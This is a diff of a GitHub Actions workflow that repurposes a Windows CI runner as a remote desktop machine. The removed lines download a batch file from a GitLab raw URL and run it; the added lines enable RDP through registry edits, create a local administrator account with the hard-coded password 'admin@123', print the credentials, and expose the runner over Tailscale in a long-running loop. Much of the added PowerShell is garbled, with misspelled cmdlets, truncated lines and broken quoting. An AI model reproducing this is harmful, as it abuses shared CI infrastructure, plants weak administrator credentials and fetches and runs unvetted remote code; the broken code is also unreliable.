@@ -1,22 +1,66 @@
-name: NewAvica
-
+name: RDP
 on:
   workflow_dispatch:
-
 jobs:
-  build:
-    name: Start Building...
+  secure-rdp:
     runs-on: windows-latest
-    timeout-minutes: 360
-    
+    timeout-minutes: 3600
     steps:
-      - name: Downloading & Installing Essentials
-        run: |
-          Invoke-WebRequest -Uri "https://gitlab.com/gusta7w7/pcrdp-avica/-/raw/main/Downloads.bat" -OutFile "Downloads.bat"
-          cmd /c Downloads.bat
+      - name: Configure Core RDP Settings
+        run:  
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name"fDenyTSconncetions' -Value
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAut
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "Security
+          netsh advfirewall firewall delete rule name="RDP-tailscale" dir=in action=allow protocol=TCP localport=3389
+          Restart-Servoce -Name TermServoce -Force
+ 
+      - name: Create RDP User with Static Passowrd 
+        run:
+          $password = "admin@123"
+          $secire[ass= = ConvertTo-SecureString $password -AsPlainText - Force 
 
-      - name: Show Website
-        run: cmd /c show.bat
+          if (-not (Get-LocalUser -Name "TOOLBOXLAP" -ErrorAction SilentlyContinue)) {
+              New-LocalUser -Name "TOOLBOXLAP" -Password $securePass -AccountNeverExpires
+          }
+          
+          Add-LocalGroupMember -Group "Administrators" -Member "TOOLBOXLAP"
+          ADD-LocalGroupMember -Group "Remote Dekstop Users" -Member "TOOLBOXLAP"
+ 
+          echo "RDP_CREDS=User: TOOLBOXLAP | Password: $password" >> $env:GITHUB_ENV
 
-      - name: Time Counter
-        run: cmd /c loop.bat
+          if (-not (Get-LocalUser -Name "toolboxlap")) {
+              Wrote-Error "User creation failed"
+              exit 1
+          }
+
+      - name: Install Tailscale 
+        run: | 
+          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
+          $installerPath = "$envTEMP\tailscale.msi"
+          
+          Invoke-Webrequest -Url $tsUrl -OutFile $installerPath
+          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quite", "/norestart" -Wait
+          Remove-Item $installerPath -Force
+
+      - name: Establish Tailscale Connection
+        run"$env:ProgramFiles\Taiscale\tailscale.exe" up -- authkey-${{ secrets.TAILSCALE_AUTH_LEY  }} --hostname=gh-runner
+        $tsIO = $null
+        $retiers - 0
+        while (-not $itsIP -and $retires -lt 10) {
+            $tsIP - & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
+            Start-Sleep -Second 5
+            $retires++
+        }
+        id (-not $tsIP)  {
+            Write-Error "Tailscale IP not assigned. Exiting."
+            exit 1
+
+        }
+        Write-Host  "`n=== RDP ACESSS ==='
+        Write-Host  "Address: $env:TAILSCALE_IP"
+        Write-Host  "Password: admin@123"
+        Write-Host  "==================`n"
+        while ($true) {
+            Write-Host  "{$(Get-Date) RDP ACTIVE - User Ctrl+C in workflow to terminate
+            Start-Sleep -Seconds 300
+          }
